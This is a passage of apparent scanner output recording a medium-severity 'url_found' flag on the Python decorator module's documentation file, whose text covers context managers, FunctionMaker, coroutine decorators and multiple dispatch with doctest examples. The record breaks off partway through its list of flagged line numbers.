factory. For instance, if you write this...\n607 \n608 ```python\n609 >>> from contextlib import contextmanager\n610 >>> @contextmanager\n611 ... def before_after(before, after):\n612 ...     print(before)\n613 ...     yield\n614 ...     print(after)\n615 \n616 ```\n617 \n618 ...then ``before_after`` is a factory function that returns\n619 ``GeneratorContextManager`` objects, usable with the ``with`` statement:\n620 \n621 ```python\n622 >>> with before_after('BEFORE', 'AFTER'):\n623 ...     print('hello')\n624 BEFORE\n625 hello\n626 AFTER\n627 \n628 ```\n629 \n630 Basically, it is as if the content of the ``with`` block was executed\n631 in the place of the ``yield`` expression in the generator function.\n632 \n633 In Python 3.2, ``GeneratorContextManager`` objects were enhanced with\n634 a ``__call__`` method, so that they can be used as decorators, like so:\n635 \n636 ```python\n637 >>> ba = before_after('BEFORE', 'AFTER')\n638 >>>\n639 >>> @ba\n640 ... def hello():\n641 ...     print('hello')\n642 ...\n643 >>> hello()\n644 BEFORE\n645 hello\n646 AFTER\n647 \n648 ```\n649 \n650 The ``ba`` decorator basically inserts a ``with ba:`` block\n651 inside the function.\n652 \n653 However ``GeneratorContextManager`` objects do not preserve the signature of\n654 the decorated functions. The decorated ``hello`` function above will\n655 have the generic signature ``hello(*args, **kwargs)``, but fails if\n656 called with more than zero arguments.\n657 \n658 For these reasons, the `decorator` module, starting from release 3.4, offers a\n659 ``decorator.contextmanager`` decorator that solves both problems,\n660 *and* works in all supported Python versions.  Its usage is identical,\n661 and factories decorated with ``decorator.contextmanager`` will return\n662 instances of ``ContextManager``, a subclass of the standard library's\n663 ``contextlib.GeneratorContextManager`` class. The subclass includes\n664 an improved ``__call__`` method, which acts as a signature-preserving\n665 decorator.\n666 \n667 ## The ``FunctionMaker`` class\n668 \n669 The ``decorator`` module also provides a ``FunctionMaker`` class, which\n670 is able to generate on-the-fly functions\n671 with a given name and signature from a function template\n672 passed as a string.\n673 \n674 If you're just writing ordinary decorators, then you probably won't\n675 need to use ``FunctionMaker``. But in some circumstances, it\n676 can be handy. You will see an example shortly--in\n677 the implementation of a cool decorator utility (``decorator_apply``).\n678 \n679 ``FunctionMaker`` provides the ``.create`` classmethod, which\n680 accepts the *name*, *signature*, and *body* of the function\n681 you want to generate, as well as the execution environment\n682 where the function is generated by ``exec``.\n683 \n684 Here's an example:\n685 \n686 ```python\n687 >>> def f(*args, **kw): # a function with a generic signature\n688 ...     print(args, kw)\n689 \n690 >>> f1 = FunctionMaker.create('f1(a, b)', 'f(a, b)', dict(f=f))\n691 >>> f1(1,2)\n692 (1, 2) {}\n693 \n694 ```\n695 \n696 It is important to notice that the function body is interpolated\n697 before being executed; **be careful** with the ``%`` sign!\n698 \n699 ``FunctionMaker.create`` also accepts keyword arguments.\n700 The keyword arguments are attached to the generated function.\n701 This is useful if you want to set some function attributes\n702 (e.g., the docstring ``__doc__``).\n703 \n704 For debugging/introspection purposes, it may be useful to see\n705 the source code of the generated function. To do this, just\n706 pass ``addsource=True``, and the generated function will get\n707 a ``__source__`` attribute:\n708 \n709 ```python\n710 >>> f1 = FunctionMaker.create(\n711 ...     'f1(a, b)', 'f(a, b)', dict(f=f), addsource=True)\n712 >>> print(f1.__source__)\n713 def f1(a, b):\n714     f(a, b)\n715 <BLANKLINE>\n716 \n717 ```\n718 \n719 The first argument to ``FunctionMaker.create`` can be a string (as above),\n720 or a function. This is the most common usage, since you typically decorate\n721 pre-existing functions.\n722 \n723 If you're writing a framework, however, you may want to use\n724 ``FunctionMaker.create`` directly, rather than ``decorator``, because it gives\n725 you direct access to the body of the generated function.\n726 \n727 For instance, suppose you want to instrument the ``__init__`` methods of a\n728 set of classes, by preserving their signature.\n729 (This use case is not made up. This is done by SQAlchemy, and other frameworks,\n730 too.)\n731 Here is what happens:\n732 \n733 - If first argument of ``FunctionMaker.create`` is a function,\n734   an instance of ``FunctionMaker`` is created with the attributes\n735   ``args``, ``varargs``, ``keywords``, and ``defaults``\n736   (these mirror the return values of the standard library's\n737   ``inspect.getfullargspec``).\n738 \n739 - For each item in ``args`` (a list of strings of the names of all required\n740   arguments), an attribute ``arg0``, ``arg1``, ..., ``argN`` is also generated.\n741 \n742 - Finally, there is a ``signature`` attribute, which is a string with the\n743   signature of the original function.\n744 \n745 **NOTE:** You should not pass signature strings with default arguments\n746 (e.g., something like ``'f1(a, b=None)'``). Just pass ``'f1(a, b)'``,\n747 followed by a tuple of defaults:\n748 \n749 ```python\n750 >>> f1 = FunctionMaker.create(\n751 ...     'f1(a, b)', 'f(a, b)', dict(f=f), addsource=True, defaults=(None,))\n752 >>> print(getfullargspec(f1))\n753 FullArgSpec(args=['a', 'b'], varargs=None, varkw=None, defaults=(None,), kwonlyargs=[], kwonlydefaults=None, annotations={})\n754 \n755 ```\n756 \n757 ## Getting the source code\n758 \n759 Internally, ``FunctionMaker.create`` uses ``exec`` to generate the\n760 decorated function. Therefore ``inspect.getsource`` will not work for\n761 decorated functions. In IPython, this means that the usual ``??`` trick\n762 will give you the (right on the spot) message ``Dynamically generated\n763 function. No source code available``.\n764 However, there is a workaround. The decorated function has the ``__wrapped__``\n765 attribute, pointing to the original function. The simplest way to get the\n766 source code is to call ``inspect.getsource`` on the undecorated function:\n767 \n768 ```python\n769 >>> print(inspect.getsource(factorial.__wrapped__))\n770 @tail_recursive\n771 def factorial(n, acc=1):\n772     \"The good old factorial\"\n773     if n == 0:\n774         return acc\n775     return factorial(n-1, n*acc)\n776 <BLANKLINE>\n777 \n778 ```\n779 \n780 ## Dealing with third-party decorators\n781 \n782 Sometimes on the net you find some cool decorator that you would\n783 like to include in your code. However, more often than not, the cool\n784 decorator is not signature-preserving. What you need is an easy way to\n785 upgrade third party decorators to signature-preserving decorators...\n786 *without* having to rewrite them in terms of ``decorator``.\n787 \n788 You can use a ``FunctionMaker`` to implement that functionality as follows:\n789 \n790 $$decorator_apply\n791 \n792 ``decorator_apply`` sets the generated function's ``__wrapped__`` attribute\n793 to the original function, so you can get the right source code.\n794 If you are using a Python later than 3.2, you should also set the\n795 ``__qualname__`` attribute to preserve the qualified name of the original\n796 function.\n797 \n798 Notice that I am not providing this functionality in the ``decorator``\n799 module directly, since I think it is best to rewrite the decorator instead\n800 of adding another level of indirection. However, practicality\n801 beats purity, so you can add ``decorator_apply`` to your toolbox and\n802 use it if you need to.\n803 \n804 To give a good example for ``decorator_apply``, I will show a pretty slick\n805 decorator that converts a tail-recursive function into an iterative function.\n806 I have shamelessly stolen the core concept from Kay Schluehr's recipe\n807 in the Python Cookbook,\n808 http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/496691.\n809 \n810 $$TailRecursive\n811 \n812 Here the decorator is implemented as a class returning callable\n813 objects.\n814 \n815 $$tail_recursive\n816 \n817 Here is how you apply the upgraded decorator to the good old factorial:\n818 \n819 $$factorial\n820 \n821 ```python\n822 >>> print(factorial(4))\n823 24\n824 \n825 ```\n826 \n827 This decorator is pretty impressive, and should give you some food for\n828 thought! ;)\n829 \n830 Notice that there is no recursion limit now; you can easily compute\n831 ``factorial(1001)`` (or larger) without filling the stack frame.\n832 \n833 Notice also that the decorator will *not* work on functions which\n834 are not tail recursive, such as the following:\n835 \n836 $$fact\n837 \n838 **Reminder:** A function is *tail recursive* if it does either of the\n839 following:\n840 \n841 - returns a value without making a recursive call; or,\n842 - returns directly the result of a recursive call.\n843 \n844 ## Python 3.5 coroutines\n845 \n846 I am personally not using Python 3.5 coroutines yet. However, some\n847 users requested support for coroutines and since version 4.1 the\n848 decorator module has it.  You should consider the support experimental\n849 and kindly report issues if you find any.\n850 \n851 Here I will give a single example of usage. Suppose you want to log the moment\n852 a coroutine starts and the moment it stops for debugging purposes. You could\n853 write code like the following:\n854 \n855 ```python\n856 import time\n857 import logging\n858 from asyncio import get_event_loop, sleep, wait\n859 from decorator import decorator\n860 \n861 @decorator\n862 async def log_start_stop(coro, *args, **kwargs):\n863     logging.info('Starting %s%s', coro.__name__, args)\n864     t0 = time.time()\n865     await coro(*args, **kwargs)\n866     dt = time.time() - t0\n867     logging.info('Ending %s%s after %d seconds', coro.__name__, args, dt)\n868 \n869 @log_start_stop\n870 async def make_task(n):\n871     for i in range(n):\n872         await sleep(1)\n873 \n874 if __name__ == '__main__':\n875     logging.basicConfig(level=logging.INFO)\n876     tasks = [make_task(3), make_task(2), make_task(1)]\n877     get_event_loop().run_until_complete(wait(tasks))\n878 ```\n879 \n880 and you will get an output like this:\n881 \n882 ```bash\n883 INFO:root:Starting make_task(1,)\n884 INFO:root:Starting make_task(3,)\n885 INFO:root:Starting make_task(2,)\n886 INFO:root:Ending make_task(1,) after 1 seconds\n887 INFO:root:Ending make_task(2,) after 2 seconds\n888 INFO:root:Ending make_task(3,) after 3 seconds\n889 ```\n890 \n891 This may be handy if you have trouble understanding what it going on\n892 with a particularly complex chain of coroutines. With a single line you\n893 can decorate the troubling coroutine function, understand what happens, fix the\n894 issue and then remove the decorator (or keep it if continuous monitoring\n895 of the coroutines makes sense). Notice that\n896 ``inspect.iscoroutinefunction(make_task)``\n897 will return the right answer (i.e. ``True``).\n898 \n899 It is also possible to define decorators converting coroutine functions\n900 into regular functions, such as the following:\n901 \n902 ```python\n903 @decorator\n904 def coro_to_func(coro, *args, **kw):\n905     \"Convert a coroutine into a function\"\n906      return get_event_loop().run_until_complete(coro(*args, **kw))\n907 ```\n908 \n909 Notice the difference: the caller in ``log_start_stop`` was a coroutine\n910 function and the associate decorator was converting coroutines in coroutines;\n911 the caller in ``coro_to_func`` is a regular function and converts\n912 coroutines -> functions.\n913 \n914 ## Multiple dispatch\n915 \n916 There has been talk of implementing multiple dispatch functions\n917 (i.e. \"generic functions\") in Python for over ten years. Last year,\n918 something concrete was done for the first time. As of Python 3.4,\n919 we have the decorator ``functools.singledispatch`` to implement generic\n920 functions!\n921 \n922 As its name implies, it is limited to *single dispatch*; in other words,\n923 it is able to dispatch on the first argument of the function only.\n924 \n925 The ``decorator`` module provides the decorator factory ``dispatch_on``,\n926 which can be used to implement generic functions dispatching on *any* argument.\n927 Moreover, it can manage dispatching on more than one argument.\n928 (And, of course, it is signature-preserving.)\n929 \n930 Here is a concrete example (from a real-life use case) where it is desiderable\n931 to dispatch on the second argument.\n932 \n933 Suppose you have an ``XMLWriter`` class, which is instantiated\n934 with some configuration parameters, and has the ``.write`` method which\n935 serializes objects to XML:\n936 \n937 $$XMLWriter\n938 \n939 Here, you want to dispatch on the *second* argument; the first is already\n940 taken by ``self``. The ``dispatch_on`` decorator factory allows you to specify\n941 the dispatch argument simply by passing its name as a string. (Note\n942 that if you misspell the name you will get an error.)\n943 \n944 The decorated function `write` is turned into a generic function (\n945 `write` is a function at the idea it is decorated; it will be turned\n946 into a method later, at class instantiation time),\n947 and it is called if there are no more specialized implementations.\n948 \n949 Usually, default functions should raise a ``NotImplementedError``, thus\n950 forcing people to register some implementation.\n951 You can perform the registration with a decorator:\n952 \n953 $$writefloat\n954 \n955 Now ``XMLWriter`` can serialize floats:\n956 \n957 ```python\n958 >>> writer = XMLWriter()\n959 >>> writer.write(2.3)\n960 '<float>2.3</float>'\n961 \n962 ```\n963 \n964 I could give a down-to-earth example of situations in which it is desiderable\n965 to dispatch on more than one argument--for instance, I once implemented\n966 a database-access library where the first dispatching argument was the\n967 the database driver, and the second was the database record--but here\n968 I will follow tradition, and show the time-honored Rock-Paper-Scissors example:\n969 \n970 $$Rock\n971 $$Paper\n972 $$Scissors\n973 \n974 I have added an ordinal to the Rock-Paper-Scissors classes to simplify\n975 the implementation. The idea is to define a generic function (``win(a,\n976 b)``) of two arguments corresponding to the *moves* of the first and\n977 second players. The *moves* are instances of the classes\n978 Rock, Paper, and Scissors:\n979 \n980 - Paper wins over Rock\n981 - Scissors wins over Paper\n982 - Rock wins over Scissors\n983 \n984 The function will return +1 for a win, -1 for a loss, and 0 for parity.\n985 There are 9 combinations, but combinations with the same ordinal\n986 (i.e. the same class) return 0. Moreover, by exchanging the order of the\n987 arguments, the sign of the result changes. Therefore, it is sufficient to\n988 directly specify only 3 implementations:\n989 \n990 $$win\n991 $$winRockPaper\n992 $$winPaperScissors\n993 $$winRockScissors\n994 \n995 Here is the result:\n996 \n997 ```python\n998 >>> win(Paper(), Rock())\n999 1\n1000 >>> win(Scissors(), Paper())\n1001 1\n1002 >>> win(Rock(), Scissors())\n1003 1\n1004 >>> win(Paper(), Paper())\n1005 0\n1006 >>> win(Rock(), Rock())\n1007 0\n1008 >>> win(Scissors(), Scissors())\n1009 0\n1010 >>> win(Rock(), Paper())\n1011 -1\n1012 >>> win(Paper(), Scissors())\n1013 -1\n1014 >>> win(Scissors(), Rock())\n1015 -1\n1016 \n1017 ```\n1018 \n1019 The point of generic functions is that they play well with subclassing.\n1020 For instance, suppose we define a ``StrongRock``, which does not lose against\n1021 Paper:\n1022 \n1023 $$StrongRock\n1024 $$winStrongRockPaper\n1025 \n1026 Then you do not need to define other implementations; they are\n1027 inherited from the parent:\n1028 \n1029 ```python\n1030 >>> win(StrongRock(), Scissors())\n1031 1\n1032 \n1033 ```\n1034 \n1035 You can introspect the precedence used by the dispatch algorithm by\n1036 calling ``.dispatch_info(*types)``:\n1037 \n1038 ```python\n1039 >>> win.dispatch_info(StrongRock, Scissors)\n1040 [('StrongRock', 'Scissors'), ('Rock', 'Scissors')]\n1041 \n1042 ```\n1043 \n1044 Since there is no direct implementation for (``StrongRock``, ``Scissors``),\n1045 the dispatcher will look at the implementation for (``Rock``, ``Scissors``)\n1046 which is available. Internally, the algorithm is doing a cross\n1047 product of the class precedence lists (or *Method Resolution Orders*,\n1048 [MRO](http://www.python.org/2.3/mro.html) for short) of ``StrongRock``\n1049  and ``Scissors``, respectively.\n1050 \n1051 ## Generic functions and virtual ancestors\n1052 \n1053 In Python, generic functions are complicated by the existence of\n1054 \"virtual ancestors\": superclasses which are not in the class hierarchy.\n1055 \n1056 Consider this class:\n1057 \n1058 $$WithLength\n1059 \n1060 This class defines a ``__len__`` method, and is therefore\n1061 considered to be a subclass of the abstract base class\n1062 ``collections.abc.Sized`` (``collections.Sized`` on Python 2):\n1063 \n1064 ```python\n1065 >>> issubclass(WithLength, collections.abc.Sized)\n1066 True\n1067 \n1068 ```\n1069 \n1070 However, ``collections.abc.Sized`` is not in the MRO_ of ``WithLength``; it\n1071 is not a true ancestor. Any implementation of generic functions (even\n1072 with single dispatch) must go through some contorsion to take into\n1073 account the virtual ancestors.\n1074 \n1075 In particular, if we define a generic function...\n1076 \n1077 $$get_length\n1078 \n1079 ...implemented on all classes with a length...\n1080 \n1081 $$get_length_sized\n1082 \n1083 ...then ``get_length`` must be defined on ``WithLength`` instances...\n1084 \n1085 ```python\n1086 >>> get_length(WithLength())\n1087 0\n1088 \n1089 ```\n1090 \n1091 ...even if ``collections.abc.Sized`` is not a true ancestor of ``WithLength``.\n1092 \n1093 Of course, this is a contrived example--you could just use the\n1094 builtin ``len``--but you should get the idea.\n1095 \n1096 Since in Python it is possible to consider any instance of ``ABCMeta``\n1097 as a virtual ancestor of any other class (it is enough to register it\n1098 as ``ancestor.register(cls)``), any implementation of generic functions\n1099 must be aware of the registration mechanism.\n1100 \n1101 For example, suppose you are using a third-party set-like class, like\n1102 the following:\n1103 \n1104 $$SomeSet\n1105 \n1106 Here, the author of ``SomeSet`` made a mistake by inheriting from\n1107 ``collections.abc.Sized`` (instead of ``collections.abc.Set``).\n1108 \n1109 This is not a problem. You can register *a posteriori*\n1110 ``collections.abc.Set`` as a virtual ancestor of ``SomeSet``:\n1111 \n1112 ```python\n1113 >>> _ = collections.abc.Set.register(SomeSet)\n1114 >>> issubclass(SomeSet, collections.abc.Set)\n1115 True\n1116 \n1117 ```\n1118 \n1119 Now, let's define an implementation of ``get_length`` specific to set:\n1120 \n1121 $$get_length_set\n1122 \n1123 The current implementation (and ``functools.singledispatch`` too)\n1124 is able to discern that a ``Set`` is a ``Sized`` object, by looking at\n1125 the class registry, so it uses the more specific implementation for ``Set``:\n1126 \n1127 ```python\n1128 >>> get_length(SomeSet())  # NB: the implementation for Sized would give 0\n1129 1\n1130 \n1131 ```\n1132 \n1133 Sometimes it is not clear how to dispatch. For instance, consider a\n1134 class ``C`` registered both as ``collections.abc.Iterable`` and\n1135 ``collections.abc.Sized``, and defines a generic function ``g`` with\n1136 implementations for both ``collections.abc.Iterable`` *and*\n1137 ``collections.abc.Sized``:\n1138 \n1139 $$singledispatch_example1\n1140 \n1141 It is impossible to decide which implementation to use, since the ancestors\n1142 are independent. The following function will raise a ``RuntimeError``\n1143 when called. This is consistent with the \"refuse the temptation to guess\"\n1144 philosophy. ``functools.singledispatch`` would raise a similar error.\n1145 \n1146 It would be easy to rely on the order of registration to decide the\n1147 precedence order. This is reasonable, but also fragile:\n1148 \n1149 - if, during some refactoring, you change the registration order by mistake,\n1150   a different implementation could be taken;\n1151 - if implementations of the generic functions are distributed across modules,\n1152   and you change the import order, a different implementation could be taken.\n1153 \n1154 So the ``decorator`` module prefers to raise an error in the face of ambiguity.\n1155 This is the same approach taken by the standard library.\n1156 \n1157 However, it should be noted that the *dispatch algorithm* used by the decorator\n1158 module is different from the one used by the standard library, so in certain\n1159 cases you will get different answers. The difference is that\n1160 ``functools.singledispatch`` tries to insert the virtual ancestors *before* the\n1161 base classes, whereas ``decorator.dispatch_on`` tries to insert them *after*\n1162 the base classes.\n1163 \n1164 Here's an example that shows the difference:\n1165 \n1166 $$singledispatch_example2\n1167 \n1168 If you play with this example and replace the ``singledispatch`` definition\n1169 with ``functools.singledispatch``, the assertion will break: ``g`` will return\n1170 ``\"container\"`` instead of ``\"s\"``, because ``functools.singledispatch``\n1171 will insert the ``Container`` class right before ``S``.\n1172 \n1173 Notice that here I am not making any bold claim such as \"the standard\n1174 library algorithm is wrong and my algorithm is right\" or vice versa. It\n1175 just point out that there are some subtle differences. The only way to\n1176 understand what is really happening here is to scratch your head by\n1177 looking at the implementations. I will just notice that\n1178 ``.dispatch_info`` is quite essential to see the class precedence\n1179 list used by algorithm:\n1180 \n1181 ```python\n1182 >>> g, V = singledispatch_example2()\n1183 >>> g.dispatch_info(V)\n1184 [('V',), ('Sized',), ('S',), ('Container',)]\n1185 \n1186 ```\n1187 \n1188 The current implementation does not implement any kind of cooperation\n1189 between implementations. In other words, nothing is akin either to\n1190 call-next-method in Lisp, or to ``super`` in Python.\n1191 \n1192 Finally, let me notice that the decorator module implementation does\n1193 not use any cache, whereas the ``singledispatch`` implementation does.\n1194 \n1195 ## Caveats and limitations\n1196 \n1197 In the present implementation, decorators generated by ``decorator``\n1198 can only be used on user-defined Python functions, methods or coroutines.\n1199 I have no interest in decorating generic callable objects. If you want to\n1200 decorate things like classmethods/staticmethods and general callables -\n1201 which I will never support in the decorator module - I suggest you\n1202 to look at the [wrapt](https://wrapt.readthedocs.io/en/latest/)\n1203 project by Graeme Dumpleton.\n1204 \n1205 Since version 5 the ``decorator`` module uses the ``inspect.Signature``\n1206 object in the standard library. Unfortunately, for legacy reasons, some\n1207 applications introspect decorated functions by using low-level entities like\n1208 the ``__code__`` object and not signature objects. An example will make\n1209 the issue clear:\n1210 \n1211 ```python\n1212 >>> def f(a, b): pass\n1213 >>> f_dec = decorator(_trace)(f)\n1214 >>> f_dec.__code__.co_argcount\n1215 0\n1216 >>> f_dec.__code__.co_varnames\n1217 ('args', 'kw')\n1218 \n1219 ```\n1220 This is not what one would expect: the `argcount` should be 2 since\n1221 the original functions has two arguments and the `varnames` should be\n1222 `a` and `b`. The only way to fix the issue is to go back to an implementation\n1223 of the decorator using ``exec``, which is provided for convenience since\n1224 version 5.1:\n1225 \n1226 ```python\n1227 >>> from decorator import decoratorx\n1228 >>> f_dec = decoratorx(_trace)(f)\n1229 >>> f_dec.__code__.co_argcount\n1230 2\n1231 >>> f_dec.__code__.co_varnames\n1232 ('a', 'b')\n1233 \n1234 ```\n1235 Rather than using `decoratorx`, you should fix your introspection\n1236 routines to use ``inspect.Signature`` without fiddling with the\n1237 ``__code__`` object.\n1238 \n1239 There is a strange quirk when decorating functions with keyword\n1240 arguments, if one of the arguments has the same name used in the\n1241 caller function for the first argument. The quirk was reported by\n1242 David Goldstein.\n1243 \n1244 Here is an example where it is manifest:\n1245 \n1246 ```python\n1247 >>> @memoize\n1248 ... def getkeys(**kw):\n1249 ...     return kw.keys()\n1250 \n1251 >>> getkeys(func='a') # doctest: +ELLIPSIS\n1252 Traceback (most recent call last):\n1253  ...\n1254 TypeError: _memoize() got multiple values for ... 'func'\n1255 \n1256 ```\n1257 \n1258 The error message looks really strange... until you realize that\n1259 the caller function `_memoize` uses `func` as first argument,\n1260 so there is a confusion between the positional argument and the\n1261 keyword arguments.\n1262 \n1263 The solution is to change the name of the first argument in `_memoize`,\n1264 or to change the implementation like so:\n1265 \n1266 ```python\n1267 \n1268 def _memoize(*all_args, **kw):\n1269     func = all_args[0]\n1270     args = all_args[1:]\n1271     if kw:  # frozenset is used to ensure hashability\n1272         key = args, frozenset(kw.items())\n1273     else:\n1274         key = args\n1275     cache = func.cache  # attribute added by memoize\n1276     if key not in cache:\n1277         cache[key] = func(*args, **kw)\n1278     return cache[key]\n1279 ```\n1280 \n1281 This avoids the need to name the first argument, so the problem\n1282 simply disappears. This is a technique that you should keep in mind\n1283 when writing decorators for functions with keyword arguments. Also,\n1284 notice that lately I have come to believe that decorating functions with\n1285 keyword arguments is not such a good idea, and you may want not to do\n1286 that.\n1287 \n1288 The implementation is such that the decorated function makes\n1289 a (shallow) copy of the original function dictionary:\n1290 \n1291 ```python\n1292 >>> def f(): pass # the original function\n1293 >>> f.attr1 = \"something\" # setting an attribute\n1294 >>> f.attr2 = \"something else\" # setting another attribute\n1295 \n1296 >>> traced_f = trace(f) # the decorated function\n1297 \n1298 >>> traced_f.attr1\n1299 'something'\n1300 >>> traced_f.attr2 = \"something different\" # setting attr\n1301 >>> f.attr2 # the original attribute did not change\n1302 'something else'\n1303 \n1304 ```\n1305 \n1306 Finally, you should be aware of the performance penalty of decorators.\n1307 The worse case is shown by the following example:\n1308 \n1309 ```bash\n1310  $ cat performance.sh\n1311  python3 -m timeit -s \"\n1312  from decorator import decorator\n1313 \n1314  @decorator\n1315  def do_nothing(func, *args, **kw):\n1316      return func(*args, **kw)\n1317 \n1318  @do_nothing\n1319  def f():\n1320      pass\n1321  \" \"f()\"\n1322 \n1323  python3 -m timeit -s \"\n1324  def f():\n1325      pass\n1326  \" \"f()\"\n1327 \n1328 ```\n1329 On my laptop, using the ``do_nothing`` decorator instead of the\n1330 plain function is five times slower:\n1331 \n1332 ```bash\n1333  $ bash performance.sh\n1334  1000000 loops, best of 3: 1.39 usec per loop\n1335  1000000 loops, best of 3: 0.278 usec per loop\n1336 ```\n1337 \n1338 Of course, a real life function probably does something more useful\n1339 than the function ``f`` here, so the real life performance penalty\n1340 *could* be negligible.  As always, the only way to know if there is a\n1341 penalty in your specific use case is to measure it.\n1342 \n1343 ## LICENSE (2-clause BSD)\n1344 \n1345 Copyright (c) 2005-2020, Michele Simionato\n1346 All rights reserved.\n1347 \n1348 Redistribution and use in source and binary forms, with or without\n1349 modification, are permitted provided that the following conditions are\n1350 met:\n1351 \n1352   Redistributions of source code must retain the above copyright\n1353   notice, this list of conditions and the following disclaimer.\n1354   Redistributions in bytecode form must reproduce the above copyright\n1355   notice, this list of conditions and the following disclaimer in\n1356   the documentation and/or other materials provided with the\n1357   distribution.\n1358 \n1359 THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n1360 \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n1361 LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\n1362 A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n1363 HOLDERS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n1364 INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n1365 BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS\n1366 OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\n1367 ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR\n1368 TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE\n1369 USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH\n1370 DAMAGE.\n1371 \n1372 If you use this software and you are happy with it, consider sending me a\n1373 note, just to gratify my ego. On the other hand, if you use this software and\n1374 you are unhappy with it, send me a patch!\n1375 \"\"\"\n1376 \n1377 today = time.strftime('%Y-%m-%d')\n",
      "filename": "/home/lyvd/panic-at-the-distro-malicious-apks/datasets/dataset4/python/decorator/src/tests/documentation.py",
      "issue_confidence": "MEDIUM",
      "issue_severity": "MEDIUM",
      "issue_text": "url_found",
      "line_number": 11,
      "line_range": [
        11,
        12,
        13,
        14,
        15,
        16,
        17,
        18,
        19,
        20,
        21,
        22,
        23,
        24,
        25,
        26,
        27,
        28,
        29,
        30,
        31,
        32,
        33,
        34,
        35,
        36,
        37,
        38,
        39,
        40,
        41,
        42,
        43,
        44,
        45,
        46,
        47,
        48,
        49,
        50,
        51,
        52,
        53,
        54,
        55,
        56,
        57,
        58,
        59,
        60,
        61,
        62,
        63,
        64,
        65,
        66,
        67,
        68,
        69,
        70,
        71,
        72,
        73,
        74,
        75,
        76,
        77,
        78,
        79,
        80,
        81,
        82,
        83,
        84,
        85,
        86,
        87,
        88,
        89,
        90,
        91,
        92,
        93,
        94,
        95,
        96,
        97,
        98,
        99,
        100,
        101,
        102,
        103,
        104,
        105,
        106,
        107,
        108,
        109,
        110,
        111,
        112,
        113,
        114,
        115,
        116,
        117,
        118,
        119,
        120,
        121,
        122,
        123,
        124,
        125,
        126,
        127,
        128,
        129,
        130,
        131,
        132,
        133,
        134,
        135,
        136,
        137,
        138,
        139,
        140,
        141,
        142,
        143,
        144,
        145,
        146,
        147,
        148,
        149,
        150,
        151,
        152,
        153,
        154,
        155,
        156,
        157,
        158,
        159,
        160,
        161,
        162,
        163,
        164,
        165,
        166,
        167,
        168,
        169,
        170,
        171,
        172,
        173,
        174,
        175,
        176,
        177,
        178,
        179,
        180,
        181,
        182,
        183,
        184,
        185,
        186,
        187,
        188,
        189,
        190,
        191,
        192,
        193,
        194,
        195,
        196,
        197,
        198,
        199,
        200,
        201,
        202,
        203,
        204,
        205,
        206,
        207,
        208,
        209,
        210,
        211,
        212,
        213,
        214,
        215,
        216,
        217,
        218,
        219,
        220,
        221,
        222,
        223,
        224,
        225,
        226,
        227,
        228,
        229,
        230,
        231,
        232,
        233,
        234,
        235,
        236,
        237,
        238,
        239,
        240,
        241,
        242,
        243,
        244,
        245,
        246,
        247,
        248,
        249,
        250,
        251,
        252,
        253,
        254,
        255,
        256,
        257,
        258,
        259,
        260,
        261,
        262,
        263,
        264,
        265,
        266,
        267,
        268,
        269,
        270,
        271,
        272,
        273,
        274,
        275,
        276,
        277,
        278,
        279,
        280,
        281,
        282,
        283,
        284,
        285,
        286,
        287,
        288,
        289,
        290,
        291,
        292,
        293,
        294,
        295,
        296,
        297,
        298,
        299,
        300,
        301,
        302,
        303,
        304,
        305,
        306,
        307,
        308,
        309,
        310,
        311,
        312,
        313,
        314,
        315,
        316,
        317,
        318,
        319,
        320,
        321,
        322,
        323,
        324,
        325,
        326,
        327,
        328,
        329,
        330,
        331,
        332,
        333,
        334,
        335,
        336,
        337,
        338,
        339,
        340,
        341,
        342,
        343,
        344,
        345,
        346,
        347,
        348,
        349,
        350,
        351,
        352,
        353,
        354,
        355,
        356,
        357,
        358,
        359,
        360,
        361,
        362,
        363,
        364,
        365,
        366,
        367,
        368,
        369,
        370,
        371,
        372,
        373,
        374,
        375,
        376,
        377,
        378,
        379,
        380,
        381,
        382,
        383,
        384,
        385,
        386,
        387,
        388,
        389,
        390,
        391,
        392,
        393,
        394,
        395,
        396,
        397,
        398,
        399,
        400,
        401,
        402,
        403,
        404,
        405,
        406,
        407,
        408,
        409,
        410,
        411,
        412,
        413,
        414,
        415,
        416,
        417,
        418,
        419,
        420,
        421,
        422,
        423,
        424,
        425,
        426,
        427,
        428,
        429,
        430,
        431,
        432,
        433,
        434,
        435,
        436,
        437,
        438,
        439,
        440,
        441,
        442,
        443,
        444,
        445,
        446,
        447,
        448,
        449,
        450,
        451,
        452,
        453,
        454,
        455,
        456,
        457,
        458,
        459,
        460,
        461,
        462,
        463,
        464,
        465,
        466,
        467,
        468,
        469,
        470,
        471,
        472,
        473,
        474,
        475,
        476,
        477,
        478,
        479,
        480,
        481,
        482,
        483,
        484,
        485,
        486,
        487,
        488,
        489,
        490,
        491,
        492,
        493,
        494,
        495,
        496,
        497,
        498,
        499,
        500,
        501,
        502,
        503,
        504,
        505,
        506,
        507,
        508,
        509,
        510,
        511,
        512,
        513,
        514,
        515,
        516,
        517,
        518,
        519,
        520,
        521,
        522,
        523,
        524,
        525,
        526,
        527,
        528,
        529,
        530,
        531,
        532,
        533,
        534,
        535,
        536,
        537,
        538,
        539,
        540,
        541,
        542,
        543,
        544,
        545,
        546,
        547,
        548,
        549,
        550,
        551,
        552,
        553,
        554,
        555,
        556,
        557,
        558,
        559,
        560,
        561,
        562,
        563,
        564,
        565,
        566,
        567,
        568,
        569,
        570,
        571,
        572,
        573,
        574,
        575,
        576,
        577,
        578,
        579,
        580,
        581,
        582,
        583,
        584,
        585,
        586,
        587,
        588,
        589,
        590,
        591,
        592,
        593,
        594,
        595,
        596,
        597,
        598,
        599,
        600,
        601,
        602,
        603,
        604,
        605,
        606,
        607,
        608,
        609,
